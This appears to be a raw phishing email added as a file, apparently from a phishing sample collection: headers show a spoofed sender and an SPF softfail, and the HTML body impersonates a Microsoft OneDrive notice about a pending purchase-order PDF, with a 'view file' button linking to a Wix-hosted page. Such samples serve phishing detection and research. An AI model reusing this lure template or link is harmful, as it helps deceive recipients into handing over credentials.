@@ -1,0 +1,117 @@
+Return-Path: postmaster@capmatic.com
+Delivered-To: jose@monkey.org
+X-FDA: 80346305424.51.6030A58
+Received: from esa2.spamcop.iphmx.com (esa2.spamcop.iphmx.com [68.232.143.151])
+	by imf29.b.hostedemail.com (Postfix) with ESMTP id 45B6B8D7DD58
+	for <jose@monkey.org>; Thu, 12 Jan 2023 13:59:52 +0000 (UTC)
+Received: from vmx.spamcop.net (HELO vmx5.spamcop.net) ([184.94.240.112])
+  by esa2.spamcop.iphmx.com with ESMTP; 12 Jan 2023 05:59:51 -0800
+Received: from capmatic.com (unknown [20.38.42.223])
+	(using TLSv1.2 with cipher DHE-RSA-AES256-GCM-SHA384 (256/256 bits))
+	(No client certificate requested)
+	by vmx5.spamcop.net (Postfix) with ESMTPSA id 40F17ED264
+	for <jose@monkey.org>; Thu, 12 Jan 2023 05:59:51 -0800 (PST)
+From: monkey.org Sales2<postmaster@capmatic.com>
+To: jose@monkey.org
+Subject: You have ( 1 ) new Pending PO File
+Date: 12 Jan 2023 13:59:46 +0000
+Message-ID: <20230112135946.287B767A635F90B7@capmatic.com>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+ARC-Authentication-Results: i=1;
+	imf29.b.hostedemail.com;
+	dkim=none;
+	dmarc=none;
+	spf=softfail (imf29.b.hostedemail.com: 68.232.143.151 is neither permitted nor denied by domain of postmaster@capmatic.com) smtp.mailfrom=postmaster@capmatic.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1673531992;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references; bh=fBAJF7RY0arYCDZR/2zdi/BmDFn3meN/jMozqBilWRY=;
+	b=6ekxzRn/PU3AR/ExpfTsehTclCmnDp4SxaZfn5PwD1dEesXRVPFkj12vHr8RrPqqsxVfkL
+	Os46Efa3E8+IB1GP88r352nVNVLQZM7b6HBv2WDLfkztUJ1oDGvlDF0J9zOEdT/ltYn3OR
+	FiF32S+Vk8tbhUWIpnjQFQ9x4d4vaYE=
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1673531992; a=rsa-sha256;
+	cv=none;
+	b=jxZqmTje/l+sLMwXFRzUH4ePBZ0sVH69XnflNbdv4E/GzC/V9JcrNfpitGa8zbxFHxVBs0
+	grd5orplfb4GUi80+1qm80ycO0gYVOjwEq3CqWINLUnKI1fddoIlmW5UMJo9v41YxiCcwE
+	XgHucJPJKltM+cKvm2DoAxcroGbQfMw=
+X-Rspamd-Server: rspam06
+X-Rspam-User: 
+Authentication-Results: imf29.b.hostedemail.com;
+	dkim=none;
+	dmarc=none;
+	spf=softfail (imf29.b.hostedemail.com: 68.232.143.151 is neither permitted nor denied by domain of postmaster@capmatic.com) smtp.mailfrom=postmaster@capmatic.com
+X-Spam-Status: No, score=5.60
+X-Rspamd-Queue-Id: 45B6B8D7DD58
+X-Stat-Signature: eujor9jhewzcgbjzjftm5fciocet781m
+X-HE-Tag: 1673531992-476733
+X-HE-Meta: U2FsdGVkX18+MOUm3mxj5EbCSBSD3i7nrlWxUKp0xT6wHvyia7Xq8iW07cQ3lLRxUNNc6Q5UVRYbBevWDvvw4b5dcJViGsKC65W3Xcupnn2gxZQ1VMg2Qi5+O82zMWLBf/E5ksITopC8kusMFGfIhzCBloX3kgvHgELLioxpptC45VZv50AiV+1brGw93JRI9kjY76/GcqqVnhMErHUdeUskwcRs97nAlpo7Jnu3FMYTicPxa6RBCZPKLaTx6EeAGKbcXGd2Q5gKgzfBK5Hgg15jt3YcDVt5Q2h1y3Mq351wpQw2LJb5V5zCCuUJK/yYm8sChh3BXPbFRd99Gf0XK6YruklpBFzXBAdB5wUzNdSZkeiXtlVbWutQFWuBdFCS9gTsSCoWHG05jzpKO/0oFrVyiCP2LlZnbCzjk4EMP39utzhEt9lPoO6V2Ii5FYxtbimNFQwU/yqTLN5ruqdkV6ZaIbf6HJ+jkDsOUNRQhuyhjECpYyn2/G3kn3f0rYqrxTFoh9jic0wz0nwGSRx6IbosGTP4M8eduyV/wuF4tB9qBI2Aa0qCZMZC+mK4lpwCW2Yma5c9lL19h4celw6bIFBB4uOV/JcKiMig0SklXtNF+Vl61QMl+wmORzauS1w2IgDU9tWbG863hq8OupvkBMiyj+ob/THUDBPcCiQ4c1K0pPcOVAP8A3ov+xmWZpanS8r5OihzREhDE+WM3vaGa3/RZ7oMh01qKNfo1ZCa3pWdzxm8wkU/8Rv09O6Px3gbYOyok5MF1ezn4wu5Lr8k2A4ic6JTWGqLbW1bsC7qkDbuGa6Jt872iXeJdCaq5MFSY2n98UfmOOJKSufImN7z9DRMhPJXHGM0oE1OuLawf9LQzhknyLxXxGwaCFBt0kwfu7dnBzDW5oAoOLigQ2QR34HWf+s5fDTLMlQnRc0LhaBRgGJXhCQp5QPFQxahuxBFz2pgNs4pW/BSu+HPu3LFb+PcL2Y
+ 9MwGYtfWyAxwkpVvRkOo/3dxaS4BD1abvoKMU+7YMu7VeojsUy7J7qOmIZQB+PiEV0h4RRKNd6PxLr8P4nJi0sQV2MZ7oklt7duGeiHcQ42Hi9S4oJETQi8idLaFfkr/d3yNNskd79WMnlSNfm8vIJgq1BSRO6bd1rmVhzMvo3FpTwdxL6JmSMDa5hY8sO9wcQ7ZJXYNjS23kmaf4NJeTtIz/8zhxlFGaEe/jDtIl83rGBxDmTdLa/JhI69bp+soDS/npMTfsP4J5GebU2cPocKchlicpACfduaQ0ZYpVWws28NoyYe9YIi6r/8/ysa6NhtUjzWq+Ma303wkvu3wwOAsWJolXfHk3fla4lSgRpHEPOXU=
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 14
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.20671"></HEAD>
+<body>
+<SPAN style=3D"FONT-SIZE: small; FONT-FAMILY: Arial, Helvetica, sans-serif;=
+ WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLOAT: none;=
+ FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYLE: normal; ORPHANS: 2; WI=
+DOWS: 2; DISPLAY: inline !important; LETTER-SPACING: normal; BACKGROUND-COL=
+OR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; fon=
+t-variant-caps: normal; text-decoration-style: initial; text-decoration-col=
+or: initial; -webkit-text-stroke-width: 0px;=20
+text-decoration-thickness: initial">&nbsp;&nbsp;&nbsp;</SPAN>
+<table style=3D"FONT-SIZE: small; MAX-WIDTH: 500px; FONT-FAMILY: Arial, Hel=
+vetica, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM:=
+ none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYLE: normal; ORPHANS:=
+ 2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); =
+font-variant-ligatures: normal; font-variant-caps: normal; text-decoration-=
+style: initial; text-decoration-color: initial; -webkit-text-stroke-width: =
+0px; text-decoration-thickness: initial" cellspacing=3D"0" cellpadding=3D"0=
+" align=3D"center" border=3D"0">
+<TBODY>
+<TR>
+<td style=3D"MARGIN: 0px" bgcolor=3D"#e5e4e2" align=3D"center">
+<P style=3D"FONT-SIZE: 20px; FONT-FAMILY: arial; COLOR: rgb(4,165,240); TEX=
+T-ALIGN: right; MARGIN-TOP: 12px; PADDING-RIGHT: 12px">OneDrive</P>
+<table style=3D"MAX-WIDTH: 85%; WIDTH: 420px" cellspacing=3D"0" cellpadding=
+=3D"0" align=3D"center" border=3D"0">
+<TBODY></TBODY></TABLE>
+<table style=3D"MAX-WIDTH: 85%; WIDTH: 420px" cellspacing=3D"0" cellpadding=
+=3D"0" align=3D"center" border=3D"0">
+<TBODY>
+<TR>
+<td style=3D"HEIGHT: 85px; MARGIN: 0px" bgcolor=3D"#e5e4e2">
+<P style=3D"HEIGHT: 212px; FONT-FAMILY: Calibri, sans-serif, serif, EmojiFo=
+nt; COLOR: rgb(74,72,72); PADDING-BOTTOM: 12px; PADDING-TOP: 12px; PADDING-=
+LEFT: 15px; MARGIN: 0px; PADDING-RIGHT: 15px">Dear jose**,<BR><BR>You have =
+( 1 ) new Pending File on OneDrive<BR>PO : PO# - 00004092.pdf<BR>DATE : [Da=
+te_short]<BR><BR>SIZE: 236K</P>
+<table cellspacing=3D"0" cellpadding=3D"0">
+<TBODY>
+<TR>
+<td style=3D"FONT-SIZE: 10px; FONT-WEIGHT: bold; COLOR: rgb(51,51,51); TEXT=
+-ALIGN: center; MARGIN: 12px; DISPLAY: block; BACKGROUND-COLOR: rgb(23,89,1=
+65)" height=3D"44" align=3D"center"><A style=3D"COLOR: rgb(51,51,51); text-=
+decoration-line: none" href=3D"https://gemcon8.wixsite.com/my-site" rel=3D"=
+noopener noreferrer" target=3D_blank data-saferedirecturl=3D"https://www.go=
+ogle.com/url?q=3Dhttp:////foeelsalvador.wixsite.com/my-site&amp;source=3Dgm=
+ail&amp;ust=3D1673610325940000&amp;usg=3DAOvVaw1Jy2p16YGus_9Sj850S8xS">
+<SPAN style=3D"FONT-SIZE: 15px; FONT-FAMILY: Calibri, sans-serif, serif, Em=
+ojiFont; COLOR: rgb(255,255,255); PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PA=
+DDING-LEFT: 24px; LINE-HEIGHT: 44px; PADDING-RIGHT: 24px">view file</SPAN><=
+/A></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE>
+<P style=3D"FONT-SIZE: 13px; FONT-FAMILY: Calibri, sans-serif, serif, Emoji=
+Font; PADDING-BOTTOM: 14px; TEXT-ALIGN: left; PADDING-TOP: 10px; PADDING-LE=
+FT: 37px; PADDING-RIGHT: 37px">You are receiving this message because you h=
+ave a Microsoft OneDrive account.</P>
+<DIV style=3D"MARGIN: 0px"><BR></DIV></TD></TR></TBODY></TABLE></BODY></HTM=
+L>
+
